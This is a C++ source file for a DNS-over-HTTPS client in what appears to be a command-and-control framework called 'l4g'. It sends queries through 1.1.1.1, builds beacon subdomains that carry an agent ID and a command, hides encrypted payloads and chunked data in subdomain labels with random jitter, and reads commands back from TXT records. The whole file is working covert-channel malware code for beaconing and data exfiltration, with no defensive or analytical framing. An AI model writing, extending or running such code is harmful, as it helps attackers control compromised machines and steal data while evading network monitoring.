#include "doh_client.hpp"
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include "../utils/crypto.hpp"

namespace l4g::c2 {

DohClient::DohClient(const std::string& endpoint) : endpoint_(endpoint) {
    init_session();
}

DohClient::~DohClient() {
    if (connection_) WinHttpCloseHandle(connection_);
    if (session_) WinHttpCloseHandle(session_);
}

bool DohClient::init_session() {
    session_ = WinHttpOpen(L"L4G/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session_) return false;
    
    // Parse endpoint for host
    std::wstring host = L"1.1.1.1";
    connection_ = WinHttpConnect(session_, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    return connection_ != nullptr;
}

std::string DohClient::generate_beacon_subdomain(const std::string& agent_id, const std::string& command) {
    // Format: <agent_id>.<command>.<random>.<timestamp>.l4g.c2
    std::random_device rd;
    std::mt19937_64 gen(rd());
    std::uniform_int_distribution<uint32_t> dist(0, 0xFFFFFFFF);
    
    uint64_t timestamp = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    
    std::ostringstream oss;
    oss << agent_id << "." << command << "." << std::hex << dist(gen) << "." << timestamp << ".l4g.c2";
    return oss.str();
}

std::string DohClient::build_dns_query(const std::string& name, const std::string& type) {
    // Build DNS wire format query
    std::vector<uint8_t> query;
    
    // Header
    uint16_t id = (uint16_t)GetTickCount();
    query.insert(query.end(), (uint8_t*)&id, (uint8_t*)&id + 2);
    uint16_t flags = 0x0100; // Standard query, recursion desired
    query.insert(query.end(), (uint8_t*)&flags, (uint8_t*)&flags + 2);
    uint16_t qdcount = 1;
    query.insert(query.end(), (uint8_t*)&qdcount, (uint8_t*)&qdcount + 2);
    uint16_t ancount = 0, nscount = 0, arcount = 0;
    query.insert(query.end(), (uint8_t*)&ancount, (uint8_t*)&ancount + 2);
    query.insert(query.end(), (uint8_t*)&nscount, (uint8_t*)&nscount + 2);
    query.insert(query.end(), (uint8_t*)&arcount, (uint8_t*)&arcount + 2);
    
    // Question: encode name
    size_t pos = 0;
    while (pos < name.size()) {
        size_t dot = name.find('.', pos);
        if (dot == std::string::npos) dot = name.size();
        size_t len = dot - pos;
        query.push_back((uint8_t)len);
        query.insert(query.end(), name.substr(pos, len).begin(), name.substr(pos, len).end());
        pos = dot + 1;
    }
    query.push_back(0); // Null terminator
    
    // QTYPE
    uint16_t qtype = (type == "TXT") ? 16 : 1; // TXT=16, A=1
    query.insert(query.end(), (uint8_t*)&qtype, (uint8_t*)&qtype + 2);
    
    // QCLASS
    uint16_t qclass = 1; // IN
    query.insert(query.end(), (uint8_t*)&qclass, (uint8_t*)&qclass + 2);
    
    // Base64url encode for DoH GET
    return crypto::base64url_encode(query);
}

DohResponse DohClient::doh_request(const std::string& dns_query) {
    DohResponse response;
    
    std::wstring url = L"/dns-query?dns=" + std::wstring(dns_query.begin(), dns_query.end());
    
    HINTERNET request = WinHttpOpenRequest(connection_, L"GET", url.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!request) {
        response.error = "WinHttpOpenRequest failed";
        return response;
    }
    
    // Add Accept header
    WinHttpAddRequestHeaders(request, L"Accept: application/dns-message", (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
    
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        response.error = "WinHttpSendRequest failed";
        WinHttpCloseHandle(request);
        return response;
    }
    
    if (!WinHttpReceiveResponse(request, nullptr)) {
        response.error = "WinHttpReceiveResponse failed";
        WinHttpCloseHandle(request);
        return response;
    }
    
    // Read response
    std::vector<uint8_t> buffer;
    DWORD available = 0;
    do {
        WinHttpQueryDataAvailable(request, &available);
        if (available == 0) break;
        
        buffer.resize(buffer.size() + available);
        DWORD read = 0;
        if (!WinHttpReadData(request, buffer.data() + buffer.size() - available, available, &read)) break;
        buffer.resize(buffer.size() - available + read);
    } while (available > 0);
    
    WinHttpCloseHandle(request);
    
    if (buffer.empty()) {
        response.error = "Empty response";
        return response;
    }
    
    response.success = true;
    response.data = parse_dns_response(buffer);
    return response;
}

std::vector<uint8_t> DohClient::parse_dns_response(const std::vector<uint8_t>& response) {
    // Parse DNS wire format response, extract TXT record data
    if (response.size() < 12) return {};
    
    // Skip header
    size_t pos = 12;
    
    // Skip question section
    while (pos < response.size() && response[pos] != 0) {
        pos += response[pos] + 1;
    }
    pos++; // Null
    pos += 4; // QTYPE + QCLASS
    
    // Parse answers
    uint16_t ancount = *(uint16_t*)(response.data() + 6);
    for (uint16_t i = 0; i < ancount; ++i) {
        if (pos + 12 > response.size()) break;
        
        // Name (compressed pointer usually)
        if ((response[pos] & 0xC0) == 0xC0) pos += 2;
        else {
            while (pos < response.size() && response[pos] != 0) pos += response[pos] + 1;
            pos++;
        }
        
        if (pos + 10 > response.size()) break;
        uint16_t type = *(uint16_t*)(response.data() + pos);
        uint16_t class_ = *(uint16_t*)(response.data() + pos + 2);
        uint32_t ttl = *(uint32_t*)(response.data() + pos + 4);
        uint16_t rdlength = *(uint16_t*)(response.data() + pos + 8);
        pos += 10;
        
        if (type == 16 && class_ == 1) { // TXT record
            if (pos + rdlength <= response.size()) {
                std::vector<uint8_t> txt_data(response.data() + pos, response.data() + pos + rdlength);
                return txt_data;
            }
        }
        pos += rdlength;
    }
    
    return {};
}

DohResponse DohClient::query(const std::string& subdomain, const std::string& record_type) {
    std::string dns_query = build_dns_query(subdomain, record_type);
    return doh_request(dns_query);
}

DohResponse DohClient::send_command(const std::vector<uint8_t>& encrypted_payload) {
    // Encode payload in subdomain chunks
    std::string encoded = crypto::base64url_encode(encrypted_payload);
    std::string subdomain = "cmd." + encoded + ".l4g.c2";
    return query(subdomain, "TXT");
}

DohResponse DohClient::receive_response() {
    // Beacon for response
    return query("beacon.l4g.c2", "TXT");
}

std::vector<DohResponse> DohClient::send_chunked(const std::vector<uint8_t>& data, size_t chunk_size) {
    std::vector<DohResponse> responses;
    std::string encoded = crypto::base64url_encode(data);
    
    for (size_t i = 0; i < encoded.size(); i += chunk_size) {
        size_t len = std::min(chunk_size, encoded.size() - i);
        std::string chunk = encoded.substr(i, len);
        std::string subdomain = "chunk." + std::to_string(i / chunk_size) + "." + chunk + ".l4g.c2";
        responses.push_back(query(subdomain, "TXT"));
        
        // Jitter between chunks
        Sleep(100 + (rand() % 500));
    }
    
    return responses;
}

std::vector<uint8_t> DohClient::receive_chunked(const std::vector<std::string>& chunks) {
    std::string combined;
    for (const auto& chunk : chunks) combined += chunk;
    return crypto::base64url_decode(combined);
}

} // namespace l4g::c2